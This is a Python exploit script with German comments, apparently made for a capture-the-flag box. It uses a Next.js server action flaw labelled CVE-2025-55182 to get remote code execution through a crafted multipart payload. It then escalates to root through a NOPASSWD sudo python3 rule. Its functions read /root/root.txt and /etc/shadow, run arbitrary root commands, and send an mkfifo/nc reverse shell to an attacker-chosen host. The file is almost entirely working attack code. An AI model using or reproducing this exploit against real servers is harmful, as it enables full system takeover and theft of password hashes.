#!/usr/bin/env python3
"""
CVE-2025-55182  —  Privilege Escalation → Root Flag
====================================================

Voraussetzung: daniel (Node.js-Prozess) hat NOPASSWD sudo auf python3:
    (ALL) NOPASSWD: /usr/bin/python3

Schritte:
  1. RCE via React2Shell → prüfen ob sudo python3 NOPASSWD vorhanden
  2. Python-Skript nach /tmp/ schreiben (kein Quote-Problem durch chr()-Encoding)
  3. sudo /usr/bin/python3 /tmp/rce_flag.py ausführen → Root-Flag ausgeben
  4. Optional: Root-Shell via sudo python3 -c 'os.system("/bin/bash")' + Reverse Shell
"""

import json
import re
import sys
import requests

try:
    import readline  # noqa: F401
except ImportError:
    try:
        import pyreadline3  # noqa: F401
    except ImportError:
        pass

# ── Target ───────────────────────────────────────────────────────────────────
TARGET_IP   = "10.114.144.103"
TARGET_PORT = 3000
BASE_URL    = f"http://{TARGET_IP}:{TARGET_PORT}"
BOUNDARY    = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

# ── RCE-Kern (gleicher Exploit wie cve_shell.py) ─────────────────────────────

def _build_js_prefix(cmd: str) -> str:
    return (
        "var res=process.mainModule.require('child_process')"
        f".execSync('{cmd}',{{'timeout':8000}}).toString().trim();;"
        "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${res}`});"
    )


def _build_body(cmd: str) -> tuple[dict, bytes]:
    field0 = json.dumps({
        "then":   "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value":  '{"then":"$B1337"}',
        "_response": {
            "_prefix":   _build_js_prefix(cmd),
            "_chunks":   "$Q2",
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }, indent=2)
    headers = {
        "User-Agent":          "Mozilla/5.0",
        "Next-Action":         "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "Content-Type":        f"multipart/form-data; boundary={BOUNDARY}",
    }
    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{field0}\r\n"
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f'[]\r\n'
        f"--{BOUNDARY}--\r\n"
    ).encode()
    return headers, body


def rce(cmd: str, timeout: int = 15) -> str:
    if "'" in cmd:
        return "[!] Einfache Anführungszeichen (') nicht erlaubt – JS-String würde brechen."
    headers, body = _build_body(cmd)
    try:
        resp = requests.post(BASE_URL, headers=headers, data=body, timeout=timeout)
    except requests.ConnectionError:
        return f"[!] Verbindung zu {BASE_URL} fehlgeschlagen."
    except requests.Timeout:
        return "[!] Timeout (>8s)."
    except requests.RequestException as exc:
        return f"[!] Request-Fehler: {exc}"

    m = re.search(r'"digest"\s*:\s*"([^"]+)"', resp.text)
    if m:
        return m.group(1).replace("\\n", "\n").replace("\\t", "\t")
    if resp.status_code == 200 and not resp.text.strip():
        return "(kein Output)"
    return f"[!] Kein digest. HTTP {resp.status_code}\n{resp.text[:300]}"


# ── Privilege Escalation Methoden ─────────────────────────────────────────────

def check_sudo() -> str:
    """Zeigt welche sudo-Rechte der aktuelle User hat."""
    return rce("sudo -l 2>&1")


def method_write_and_run(target_file: str = "/root/root.txt") -> str:
    """
    Methode 1: Python-Script nach /tmp/ schreiben, dann mit sudo ausführen.

    Warum chr()-Encoding?
      Im JS execSync-Aufruf sind wir in einem Single-Quote-String.
      Single Quotes im Befehl würden den String brechen.
      chr()-Ausdrücke bauen den Pfad ohne Quotes zusammen.
    """
    # /root/root.txt als chr()-Ausdruck aufbauen
    path_chars = "+".join(f"chr({ord(c)})" for c in target_file)
    py_script   = f"f=open({path_chars});print(f.read().strip())"

    print(f"  [*] Schreibe Python-Helper nach /tmp/rce_flag.py …")
    print(f"      Script-Inhalt: {py_script}")
    out = rce(f'echo "{py_script}" > /tmp/rce_flag.py')
    if out.startswith("[!]"):
        return out
    print("  [+] Script geschrieben.")

    print("  [*] Führe aus: sudo /usr/bin/python3 /tmp/rce_flag.py")
    result = rce("sudo /usr/bin/python3 /tmp/rce_flag.py")
    return result


def method_inline_python(target_file: str = "/root/root.txt") -> str:
    """
    Methode 2: Direkt als Einzeiler ohne Temp-Datei.
    Nutzt Base64-Encoding um Quote-Probleme zu umgehen.
    """
    import base64
    py_code  = f'open("{target_file}").read().strip()'
    b64      = base64.b64encode(f"print({py_code})".encode()).decode()
    cmd      = f"sudo /usr/bin/python3 -c \"import base64,sys;exec(base64.b64decode('{b64}').decode())\""
    return rce(cmd)


def method_read_shadow() -> str:
    """Bonus: /etc/shadow lesen (zeigt ob wir wirklich root sind)."""
    return rce("sudo /usr/bin/python3 -c \"print(open(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(115)+chr(104)+chr(97)+chr(100)+chr(111)+chr(119)).read()[:200])\"")


def method_revshell_root(lhost: str, lport: int) -> None:
    """
    Root Reverse Shell via:
      sudo python3 -c 'import os; os.system("mkfifo ...")'
    Der Python3-Prozess läuft als root → die Shell ist root.
    """
    mkfifo_cmd = (
        f"rm /tmp/rf;mkfifo /tmp/rf;cat /tmp/rf"
        f"|sh -i 2>&1|nc {lhost} {lport} >/tmp/rf"
    )
    # Base64 um Quotes zu vermeiden
    import base64
    b64 = base64.b64encode(f'import os;os.system("{mkfifo_cmd}")'.encode()).decode()
    cmd = f"sudo /usr/bin/python3 -c \"import base64;exec(base64.b64decode('{b64}').decode())\""
    headers, body = _build_body(cmd)
    try:
        requests.post(BASE_URL, headers=headers, data=body, timeout=5)
    except Exception:
        pass  # Verbindungsabbruch beim Shell-Spawn ist normal


# ── Interaktive Root-Shell ────────────────────────────────────────────────────

HELP = """
Root-Escalation Befehle:
  1 / flag          → Root-Flag via /tmp/rce_flag.py (Methode 1)
  2 / flag2         → Root-Flag inline Base64 (Methode 2, kein /tmp nötig)
  shadow            → /etc/shadow lesen (Proof-of-Root)
  sudo              → sudo -l anzeigen
  run <cmd>         → beliebigen sudo python3 Befehl ausführen
                      Beispiel: run cat /etc/passwd
  revshell <ip> <port>  → Root Reverse Shell (vorher: nc -lvnp <port>)
  whoami            → zeigt aktuellen User auf dem Server
  help / ?          → diese Hilfe
  exit / q          → beenden
"""


def run_root_shell() -> None:
    print("\n  Root-Escalation Shell bereit.")
    print("  Tippe 'help' für Befehle.\n")

    while True:
        try:
            raw = input("\033[31mroot-escalation\033[0m> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Beendet.")
            break

        if not raw:
            continue

        low = raw.lower()

        if low in ("exit", "q", "quit"):
            print("[*] Beendet.")
            break

        if low in ("help", "?"):
            print(HELP)
            continue

        if low in ("1", "flag"):
            print("\n[*] Methode 1: /tmp/rce_flag.py")
            result = method_write_and_run()
            if result and not result.startswith("[!]"):
                print(f"\n    ★  ROOT FLAG: {result}\n")
            else:
                print(f"[-] {result}")
            continue

        if low in ("2", "flag2"):
            print("\n[*] Methode 2: Inline Base64")
            result = method_inline_python()
            if result and not result.startswith("[!]"):
                print(f"\n    ★  ROOT FLAG: {result}\n")
            else:
                print(f"[-] {result}")
            continue

        if low == "shadow":
            print("\n[*] Lese /etc/shadow …")
            print(method_read_shadow())
            continue

        if low == "sudo":
            print(check_sudo())
            continue

        if low == "whoami":
            print(rce("id && whoami"))
            continue

        if low.startswith("run "):
            subcmd = raw[4:].strip()
            # Wrapper: führt Befehl über sudo python3 -c os.system() aus
            import base64
            b64 = base64.b64encode(f'import os;os.system("{subcmd}")'.encode()).decode()
            out = rce(f"sudo /usr/bin/python3 -c \"import base64;exec(base64.b64decode('{b64}').decode())\"")
            print(out)
            continue

        if low.startswith("revshell"):
            parts = raw.split()
            if len(parts) != 3:
                print("Nutzung: revshell <lhost> <lport>")
                print("Beispiel: revshell 10.9.0.1 4444")
                print("Vorher auf deiner Maschine: nc -lvnp 4444")
                continue
            lhost = parts[1]
            try:
                lport = int(parts[2])
            except ValueError:
                print("[!] Port muss eine Zahl sein.")
                continue
            print(f"[*] Sende Root Reverse Shell → {lhost}:{lport}")
            print(f"[!] Stelle sicher: nc -lvnp {lport} läuft auf deiner Maschine!")
            method_revshell_root(lhost, lport)
            print("[+] Payload gesendet! Shell läuft als ROOT.")
            continue

        print(f"[?] Unbekannter Befehl: '{raw}' – tippe 'help'")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    print("═" * 65)
    print("  CVE-2025-55182  —  Root Flag / Privilege Escalation")
    print(f"  Target : {BASE_URL}")
    print("═" * 65)

    # 1. RCE prüfen
    print("\n[1] Prüfe RCE …")
    out = rce("id")
    if out.startswith("[!]"):
        print(out)
        print("[-] Kein RCE erreichbar. IP/Port prüfen.")
        sys.exit(1)
    print(f"[+] RCE OK  →  {out}")

    # 2. Sudo-Rechte prüfen
    print("\n[2] Prüfe sudo-Rechte (sudo -l) …")
    sudo_out = check_sudo()
    print(sudo_out)

    if "python3" not in sudo_out.lower():
        print("\n[!] WARNUNG: sudo python3 nicht sichtbar in sudo -l.")
        print("    Die Methoden könnten trotzdem funktionieren. Weiter? (j/n)")
        if input("> ").strip().lower() != "j":
            sys.exit(0)

    # 3. Direkt Root-Flag versuchen
    print("\n[3] Versuche Root-Flag direkt (Methode 1) …")
    flag = method_write_and_run()
    if flag and not flag.startswith("[!]"):
        print(f"\n    ★  ROOT FLAG: {flag}\n")
        print("[*] Flag gefunden! Starte trotzdem interaktive Shell? (j/n)")
        if input("> ").strip().lower() != "j":
            return

    # 4. Interaktive Shell
    run_root_shell()


if __name__ == "__main__":
    main()
